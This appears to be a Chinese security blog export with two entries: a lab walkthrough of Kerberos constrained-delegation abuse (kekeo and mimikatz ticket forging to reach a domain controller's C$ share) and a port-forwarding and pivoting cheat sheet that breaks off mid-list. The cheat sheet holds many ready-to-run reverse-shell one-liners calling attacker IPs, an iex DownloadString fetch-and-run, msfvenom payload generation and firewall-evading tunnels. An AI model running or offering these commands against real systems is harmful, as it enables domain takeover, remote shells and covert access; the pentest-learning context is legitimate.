PowerShell脚本枚举域帐户的SPN</p><p>GetUserSPNs - kerberoast<br><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p><pre><code>PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1ServicePrincipalName : kadmin/changepwName                 : krbtgtSAMAccountName       : krbtgtMemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=localPasswordLastSet      : 9/13/2016 11:37:59 AMServicePrincipalName : test/testName                 : testwin10SAMAccountName       : testwin10MemberOf             :PasswordLastSet      : 1/12/2018 3:00:22 PM</code></pre><p>Get-NetUser - PowerView</p><pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spnobjectsid              : S-1-5-21-1239069908-882060383-2558203358-502iscriticalsystemobject : Truesamaccounttype         : 805306368primarygroupid         : 513instancetype           : 4badpasswordtime        : 1/1/1601 8:00:00 AMlastlogoff             : 1/1/1601 8:00:00 AMwhenchanged            : 1/12/2018 6:32:42 AMbadpwdcount            : 0useraccountcontrol     : 514usncreated             : 12324countrycode            : 0admincount             : 1objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=localobjectclass            : {top, person, organizationalPerson, user}logoncount             : 0lastlogon              : 1/1/1601 8:00:00 AMserviceprincipalname   : kadmin/changepwadspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=localdscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=localcn                     : krbtgtpwdlastset             : 9/13/2016 11:37:59 AMobjectguid             : 547b1f4b-4f25-4a4f-96e9-2480d6f2e896whencreated            : 9/13/2016 3:37:59 AMdescription            : Key Distribution Center Service Accountsamaccountname         : krbtgtshowinadvancedviewonly : Truememberof               : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=localaccountexpires         : 9223372036854775807usnchanged             : 28705name                   : krbtgtcodepage               : 0objectsid             : S-1-5-21-1239069908-882060383-2558203358-1126samaccounttype        : 805306368primarygroupid        : 513instancetype          : 4badpasswordtime       : 1/17/2018 8:47:37 PMaccountexpires        : 0whenchanged           : 1/13/2018 3:43:54 AMbadpwdcount           : 0useraccountcontrol    : 524800name                  : testwin10codepage              : 0objectclass           : {top, person, organizationalPerson, user}logoncount            : 23lastlogon             : 1/18/2018 7:37:12 AMserviceprincipalname  : test/testusncreated            : 32796dscorepropagationdata : {1/13/2018 3:43:54 AM, 1/1/1601 12:00:00 AM}distinguishedname     : CN=testwin10,CN=Users,DC=demo,DC=localcn                    : testwin10pwdlastset            : 1/12/2018 3:00:22 PMobjectguid            : 2d8ce475-2bd9-4827-a3ed-6e8b4695d516whencreated           : 1/12/2018 7:00:22 AMsamaccountname        : testwin10countrycode           : 0objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=localadspath               : LDAP://CN=testwin10,CN=Users,DC=demo,DC=localusnchanged            : 33123lastlogoff            : 1/1/1601 8:00:00 AMlastlogontimestamp    : 1/12/2018 3:00:40 PM</code></pre><p>或者 (使用dsquery获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegateto)</p><pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto  cn           operatingSystem                      distinguishedName                                      useraccountcontrol    msds-allowedtodelegateto  OWA2010DC    Windows Server 2008 R2 Datacenter    CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local    532480  OWA2010      Windows Server 2008 R2 Datacenter    CN=OWA2010,CN=Computers,DC=demo,DC=local               4096  WIN10-NEW    Windows 10 Enterprise 2016 LTSB      CN=WIN10-NEW,CN=Computers,DC=demo,DC=local             16781312              cifs/OWA2010DC.demo.local/demo.local;cifs/OWA2010DC.demo.local;cifs/OWA2010DC;cifs/OWA2010DC.demo.local/DEMO;cifs/OWA2010DC/DEMO;</code></pre><p>或者 (获取用戶某些信息 包括useraccountcontrol)</p><pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto  cn             distinguishedName                             useraccountcontrol        msds-allowedtodelegateto  Administrator  CN=Administrator,CN=Users,DC=demo,DC=local 66048  Guest          CN=Guest,CN=Users,DC=demo,DC=local         66082  krbtgt         CN=krbtgt,CN=Users,DC=demo,DC=local         514  testwin10      CN=testwin10,CN=Users,DC=demo,DC=local     524800</code></pre><p>测试主机为域内Windows 10系统，现在以普通域用户testwin10登录系统，IPC方式连接域服务器，访问域服务器的C盘目录，显示被拒绝，权限不够。</p><p>C:\Users\testwin10&gt;whoami</p><pre><code>demo\testwin10</code></pre><p>C:\Users\testwin10&gt;dir \owa2010dc.demo.local\c$</p><pre><code>Access is denied.</code></pre><p><img src="/2018/01/25/利用域委派获取域某些权限/testwin10.png" alt="testwin10"></p><p>现在已知域内机器账号的口令(计算机的机器账号密码默认是随机的，每30天轮换一次)，则可使用kekeo工具构造WIN10-NEW机器账号的票据。命令和执行结果如下</p><pre><code>tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b</code></pre><p>已知域内主机账号(机器账号WIN10-NEW$)，使用kekeo工具构造该主机账号的TGT票据 ：<br><img src="/2018/01/25/利用域委派获取域某些权限/kekeo.png" alt="kekeo"></p><p>如果是服务账号的话命令就是：</p><pre><code>tgt::ask /user:sqlsrv /domain:demo.local /password:xxx /ticket:sqlsrv.kirbi)kekeo # tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13bRealm        : demo.local (demo)User         : WIN10-NEW$ (WIN10-NEW$)CName        : WIN10-NEW$       [KRB_NT_PRINCIPAL (1)]SName        : krbtgt/demo.local        [KRB_NT_SRV_INST (2)]Need PAC     : YesAuth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5b8303606d3478a49e47650272fea13b[kdc] name: OWA2010DC.demo.local (auto)[kdc] addr: 192.168.18.10 (auto)  Ticket in file &#39;TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi&#39;</code></pre><p>小知识</p><pre><code>Pass the Ticket (票据传递攻击PtT)知道用户的ntlm值，由kekeo生成TGT票据，之后导入票据即可</code></pre><p>由于设置了约束性委派所以利用刚才的WIN10-NEW$的TGT票据，像域服务器发起申请访问域服务器相应服务(CIFS共享服务)管理权限的TGS票据 ： </p><pre><code>Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access</code></pre><p>即：</p><pre><code>kekeo # tgs::s4u /tgt:TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi /user:administrator@demo.local /service:cifs/OWA2010DC.demo.localTicket  : TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi  [krb-cred]     S: krbtgt/demo.local @ DEMO.LOCAL  [krb-cred]     E: [00000012] aes256_hmac  [enc-krb-cred] P: WIN10-NEW$ @ DEMO.LOCAL  [enc-krb-cred] S: krbtgt/demo.local @ DEMO.LOCAL  [enc-krb-cred] T: [1/12/2018 2:17:58 AM ; 1/12/2018 12:17:58 PM] {R:1/19/2018 2:17:58 AM}  [enc-krb-cred] F: [40e00000] pre_authent ; initial ; renewable ; forwardable ;  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): a9e1f34bc1c62de37793943742e0f235a4ba0a0ec01a9899f52b1e9e7798970c  [s4u2self]  administrator@demo.local[kdc] name: OWA2010DC.demo.local (auto)[kdc] addr: 192.168.18.10 (auto)  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi&#39;Service(s):  [s4u2proxy] cifs/OWA2010DC.demo.local  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi&#39;</code></pre><p>向域服务器发起申请访问域服务器相应服务(CIFS服务)管理权限的TGS票据<br><img src="/2018/01/25/利用域委派获取域某些权限/cfis1.png" alt="cfis1"></p><p>ok</p><p>此时内存中已经有了访问域服务器CIFS服务的域管理员的TGS票据，需要将该票据(administrator的TGS票据)注入当前的会话中，使用mimikatz的kerberos::ptt命令可完成票据的注入。<br>注入票据后，当前的会话具备了访问域服务器C盘目录的权限 kekeo ticket 注入 </p><pre><code>kerberos::ptt TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi</code></pre><p>注入票据后，访问域服务器C盘目录的权限<br><img src="/2018/01/25/利用域委派获取域某些权限/cfis2.png" alt="cfis2"></p><pre><code>dir \\owa2010dc.demo.local\c$ ==&gt; ok</code></pre><p>(4个小时后TGT失效，需要重新认证。)</p><p><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> 示例有四個，他演示的是示例1，这里演示的是示例4</p><pre><code>样例1：已知被设置约束性委派属性的服务账号的口令明文，则可以获取域管理权限样例2：已控制约束性委派服务账号所在的服务器    攻击者控制了服务器，与样例1类似。由于攻击者控制了服务器，可直接利用mimikatz从内存获取服务账号的TGT，所以可以省去tgt::ask步骤，直接从tgs:s4u步骤开始，后续和样例1相同。样例3：已获取配置了约束性委派的服务账号的口令NTLM    和样例1相同，样例1用明文口令生成NTLM，然后向域服务器申请获取服务账号的TGT。Kekeo提供了该功能，可直接从NTLM开始，向域服务器申请TGT。样例4：一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM    方法和样例1也是类似，只不过样例1中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。</code></pre><h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>20180702<br>利用 Kerberos delegation 打造变种黄金票据<br><a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">https://paper.seebug.org/620/</a></p><p>我测试的是域委派cifs服务SPN（共享服务），而这个文章直接测试的是krbtgt，意思是黄金票据和域委派相结合操作，挺牛逼的。<br>过程都一样，只是换了SPN和工具。</p><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><pre><code>https://www.anquanke.com/post/id/92484  (作者笔误： &quot;由于sqlsvc被设置为非约束性委派&quot; 改成 &quot;由于sqlsvc被设置为约束性委派&quot; 已证明 )http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/http://powersploit.readthedocs.io/en/latest/https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
            <tag> 域委派 </tag>
            
            <tag> TGS票据 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>端口转发总结</title>
      <link href="/2018/01/20/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/"/>
      <url>/2018/01/20/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>…..<br><a id="more"></a></p><h2 id="传统反弹与网络发现"><a href="#传统反弹与网络发现" class="headerlink" title="传统反弹与网络发现"></a>传统反弹与网络发现</h2><p><strong>协议的判断</strong></p><p>主要是看能够通过什么协议出去，主要有tcp\http\dns\icmp等协议。常见判断手法如下：</p><p>tcp协议</p><pre><code>外网vps : nc –lvp port内网机器：nc ip port</code></pre><p>dns协议</p><pre><code>外网vps: nc –u –lvp 53内网机器:windows: nslookup www.baidu.com vps-iplinux：dig @vps-ip www.baidu.com</code></pre><p>http协议</p><pre><code>外网vps : nc –lvp 80 (or 8080等)内网机器 ： curl vps-ip:8080</code></pre><p>icmp协议</p><pre><code>外网vps：抓包、tcpdump icmp内网机器:直接ping</code></pre><p><strong>端口的判断</strong></p><p>外网vps做监听，内网机器测试常见端口，或直接使用端口扫描器进行扫描。</p><p>常见能出去的端口有80,8080,443,53,110,123等。</p><p><strong>额外情况–代理服务器</strong><br>还有一种是机器不能直接出来的，需要进行代理设置，这种多数是为了办公网段得办公人员进行上网用的。</p><p>常用的判断手法与情况如下：</p><pre><code>查看网络连接看是否有连接其他机器的8080（不绝对）等端口，尝试ping –n 1 –a ip是否有hostname类似于proxy的机器IE直接代理情况</code></pre><p>可以通过查询注册表得到：</p><pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServerreg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><p>通过pac文件自动代理情况</p><pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL</code></pre><p>我们可以通过pac文件的路径（可能是本地路径或远程路径）将pac文件下载回来查看，例如某pac文件如下：从中我们能看到其带来服务器为172.16.10.168:8080</p><pre><code>    function islocalip(ip) {           return isInNet(ip, &quot;127.0.0.0&quot;, &quot;255.0.0.0&quot;) ||                     isInNet(ip, &quot;169.254.0.0&quot;, &quot;255.255.0.0&quot;) ||                     isInNet(ip, &quot;10.0.0.0&quot;, &quot;255.0.0.0&quot;) ||                     isInNet(ip, &quot;192.168.0.0&quot;, &quot;255.255.0.0&quot;) ||                     }    function FindProxyForURL(url, host) {           var DefaultScanner = &quot;PROXY 172.16.10.168:8080; DIRECT&quot;;           var target_ip = dnsResolve(host);           if (islocalip(target_ip)) {                         return &#39;DIRECT&#39;;           } else {                  return DefaultScanner;           }    }</code></pre><p>最终我们可以利用curl进行确定：</p><pre><code>curl        www.baidu.com      //不通 curl –x     proxy-ip:8080 www.baidu.com   //通icmp        ping baidu.com http        curl -i  baidu.com tcp         telnet baidu.com dns         nslookup baidu.com    //当然这里不一定非要百度</code></pre><p>其他反弹</p><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>顺便提下</p><pre><code>searchsploit ms17  |grep py  只匹配py脚本searchsploit -p 41891.rb 复制完整路径并显示详细信息searchsploit -m 41891.rb 复制到当前目录searchsploit -w ms17-010  显示exploit-db在线结果</code></pre><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipephp -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>1、编辑配置文件/etc/sysctl.conf</p><pre><code>net.ipv4.ip_forward = 1</code></pre><p>2、关闭服务</p><pre><code>service iptables stop</code></pre><p>3、配置规则</p><p>需要访问的内网地址：192.168.206.101<br>内网边界web服务器：192.168.206.129</p><pre><code>iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</code></pre><p>4、保存&amp;&amp;重启服务</p><pre><code>service iptables save &amp;&amp; service iptables start</code></pre><h2 id="EarthWorm-绕防火墙"><a href="#EarthWorm-绕防火墙" class="headerlink" title="EarthWorm[绕防火墙]"></a>EarthWorm[绕防火墙]</h2><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p><ol><li><p>正向 SOCKS v5 服务器</p><p> $ ./ew -s ssocksd -l 1080</p></li><li><p>反弹 SOCKS v5 服务器<br>这个操作具体分两步：</p><p> a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><pre><code> $ ./ew -s rcsocks -l 1080 -e 8888 </code></pre><p> b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p><pre><code> $ ./ew -s rssocks -d 1.1.1.1 -e 8888 </code></pre></li><li><p>多级级联</p></li></ol><p>工具中自带的三条端口转发指令，<br>它们的参数格式分别为：</p><pre><code>$ ./ew -s lcx_listen -l  1080   -e 8888$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999</code></pre><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。<br>首先提供两个“二级级联”本地SOCKS测试样例：</p><pre><code>a) lcx_tran 的用法    $ ./ew -s ssocksd  -l 9999    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999b) lcx_listen、lcx_slave 的用法    $ ./ew -s lcx_listen -l 1080 -e 8888    $ ./ew -s ssocksd    -l 9999    $ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</code></pre><p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><pre><code>$ ./ew -s rcsocks -l 1080 -e 8888$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999$ ./ew -s lcx_listen -l 9999 -e 7777$ ./ew -s rssocks -d 127.0.0.1 -e 7777</code></pre><p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p><h2 id="Shell反弹不出-DMZ"><a href="#Shell反弹不出-DMZ" class="headerlink" title="Shell反弹不出[DMZ]"></a>Shell反弹不出[DMZ]</h2><p>1、先生成一个bind_shell</p><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=12345 -f exe -o ./shell.exe</code></pre><p>2、本地利用tunna工具进行端口转发</p><pre><code>python proxy.py -u http://xxxx.com/conn.jsp  -l 3333 -r 12345 v</code></pre><p>3、监听</p><pre><code>use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset LPORT 3333</code></pre><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>三种不同类型的ssh隧道</p><p><a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a></p><p>通过VPS SSH隧道使用本地msf<br><a href="https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</a></p><p>本地访问127.0.0.1:port1就是host:port2(用的更多)</p><pre><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发</code></pre><p>访问host:port2就是访问127.0.0.1:port1</p><pre><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发</code></pre><p>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</p><pre><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port</code></pre><p>可以将dmz_host的hostport端口转发到remote_ip的port端口</p><pre><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip  </code></pre><p>socket代理</p><pre><code>ssh -qTfnN -D port remotehost</code></pre><p>反向隧道，用于内网穿透防火墙限制之类</p><pre><code>-q      #安静模式-T      #不占用shell-f      #后台运行，推荐加-n参数-N      #不执行远程命令</code></pre><p>set RHOST 127.0.0.1</p><h2 id="Netsh-tcp"><a href="#Netsh-tcp" class="headerlink" title="Netsh[tcp]"></a>Netsh[tcp]</h2><p>添加转发规则</p><pre><code>netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</code></pre><p>删除转发规则</p><pre><code>netsh interface portproxy delete v4tov4 listenport=9090</code></pre><p>查看现有规则</p><pre><code>netsh interface portproxy show all</code></pre><p>xp需要安装ipv6</p><pre><code>netsh interface ipv6 install</code></pre><h2 id="nc-正向"><a href="#nc-正向" class="headerlink" title="nc [正向]"></a>nc [正向]</h2><pre><code>1、 nc -e /bin/sh -lp 1234    nc -e /bin/sh 223.8.200.234 1234    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f     nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 99992、  mknod /tmp/backpipe p    /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe3、  nc.exe -e cmd.exe -lp 1234  [windows]</code></pre><h2 id="lcx-内网转发"><a href="#lcx-内网转发" class="headerlink" title="lcx 内网转发"></a>lcx 内网转发</h2><p>监听1234端口,转发数据到2333端口</p><pre><code>本地:lcx.exe -listen 1234 6666</code></pre><p>将目标的3389转发到本地的1234端口</p><pre><code>肉鸡:lcx.exe -slave my_ip 1234 127.0.0.1 3389</code></pre><p>re:最好有个vps</p><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p>python reGeorgSocksProxy.py -p 4444 -u <a href="http://xxx.com/tunnel.php" target="_blank" rel="noopener">http://xxx.com/tunnel.php</a><br>vim /etc/proxychains.conf</p><pre><code>socks5 127.0.0.1 4444</code></pre><p>proxychains4 nmap -sT -Pn -n 192.168.1.2</p><h2 id="Tunna-速度较慢"><a href="#Tunna-速度较慢" class="headerlink" title="Tunna[速度较慢]"></a>Tunna[速度较慢]</h2><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p><pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v rdesktop 127.0.0.1:1234</code></pre><h2 id="Linux-portmap-端口映射"><a href="#Linux-portmap-端口映射" class="headerlink" title="Linux portmap 端口映射"></a>Linux portmap 端口映射</h2><p>转发ssh到外网 不太常用</p><pre><code>./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    #先在外网执行./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  #在内网shell下执行ssh 127.0.0.1 -p 7777   #在外网机器上执行</code></pre><p>rtcp.py</p><pre><code>1. 在B服务器上运行：    ./rtcp.py l:10001 l:10002    表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了2. 在A服务器上运行：    ./rtcp.py c:localhost:22 c:222.2.2.2:10001    表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了3. 然后我们就可以这样来访问A服务器的22端口了：    ssh 222.2.2.2 -p 10002    如果报错ssh_exchange_identification: read: Connection reset by peer  解决方法chmod 400 /etc/ssh/*</code></pre><p>tunna</p><pre><code>第一步 运行proxy.py 并指定端口 python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v第二步 本地执行  rdesktop 127.0.0.1:1234python2.7 proxy.py -u http://x.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389   #-a指定内网的机器</code></pre><p>htran<br>正向代理</p><pre><code>服务端      htran.exe -s -bind 8888客户端      SocksCap:SOCKS Version 5 服务端IP:8888</code></pre><p>反向代理</p><pre><code>客户端      htran.exe -s -listen 1234 8888服务端      htran.exe -s -connect 客户端IP 1234客户端      SocksCap:SOCKS Version 5 127.0.0.1:8888</code></pre><p>正向端口转发</p><pre><code>服务端      htran.exe -p -tran 8888 127.0.0.1 3389客户端      RDP 服务端IP:8888</code></pre><p>反向端口转发</p><pre><code>客户端      htran.exe -p -listen 1234 8888服务端      htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389客户端      RDP 127.0.0.1:8888</code></pre><p>iptables端口映射</p><pre><code>bashvi /etc/sysctl.conf #将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1 开启转发功能sysctl -p   #使数据转发功能生效iptables -t nat -A PREROUTING --dst 192.168.46.129 -p tcp --dport 81 -j DNAT --to-destination 172.24.20.25:80 #把本地192.168.46.129的81端口转为目标172,24.20.25的80端口iptables -t nat -A POSTROUTING --dst 172.24.20.25 -p tcp --dport 80  -j SNAT --to-source 192.168.46.129   #172.24.20.25:80返回时 将ip修改为192.168.46.129</code></pre><h2 id="端口转发之PowerShell"><a href="#端口转发之PowerShell" class="headerlink" title="端口转发之PowerShell"></a>端口转发之PowerShell</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><pre><code>Victim IP : 192.168.52.1Attacker IP : 192.168.52.129</code></pre><p>1.Reverse shell[tcp]</p><pre><code>Attacker:    nc -lvp 4444Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1    PS F:\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444</code></pre><p>2.Bind shell[tcp]</p><pre><code>Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1    PS F:\Shells&gt; Invoke-PowerShellTcp -Bind -Port 8888Attacker:    PS F:\Shells&gt; . .\powercat.ps1    PS F:\Shells&gt; powercat -c 192.168.52.1 -v -p 8888</code></pre><p>3.Reverse shell[UDP]支持ipv6</p><pre><code>Attacker:    nc -lvup 53Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1    PS F:\Shells&gt; Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53</code></pre><p>4.Bind shell[UDP]</p><pre><code>Victim:    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1    PS F:\Shells&gt; Invoke-PowerShellUdp -Bind -Port 7777Attacker:    nc -vtu 192.168.52.1 7777</code></pre><p>5.HTTPS</p><p><a href="https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1</a></p><p>需要Attacker以管理员身份运行,nishang作者最新的脚本会出现错误</p><pre><code>Attacker:    PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1    PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 80 -SSLPort 443Victim:    PS C:\&gt; iex (New-Object Net.WebClient).DownloadString(&quot;http://192.168.52.1/connect&quot;)</code></pre><p>6.DNS shell<br>dnscat2 : <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)<br>powercat: <a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a>)</p><p>dnscat2讲解<br><a href="https://04z.net/2017/07/13/DNS-Tunnel/" target="_blank" rel="noopener">https://04z.net/2017/07/13/DNS-Tunnel/</a></p><pre><code>Attacker:    root@kali:~# ruby dnscat2.rb shellcome.comVictim:    PS F:\Shells&gt; . .\powercat.ps1    PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep</code></pre><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><pre><code>meterpreter&gt; run autoroute -s 192.168.1.0/24meterpreter&gt; use auxiliary/server/socks4amsf&gt; route add 192.168.1.0 255.255.255.0 192.168.1.1 [sessionid]</code></pre><h2 id="防火墙开启的ms17-010"><a href="#防火墙开启的ms17-010" class="headerlink" title="防火墙开启的ms17-010"></a>防火墙开启的ms17-010</h2><p>例如:详细查找ms17-010<br><a href="https://packetstormsecurity.com/search/?q=MS17-010" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS17-010</a></p><pre><code>1、上传EarthWorm转发端口445到指定端口,然后利用eternalblue+Doublepulsar溢出目标8888端口，成功回弹系统权限的shell2、由于防火墙限制（也可能其他），直接添加管理员始终不能成功3、上传工具，获取管理员密码hash破解，成功登陆3389./ew -s lcx_tran -l 8888 -f 127.0.0.1-g 445</code></pre><h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><p>re. 使用方法    <a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3502.html</a></p><pre><code>Earthworm            http://rootkiter.com/EarthWormxsocks            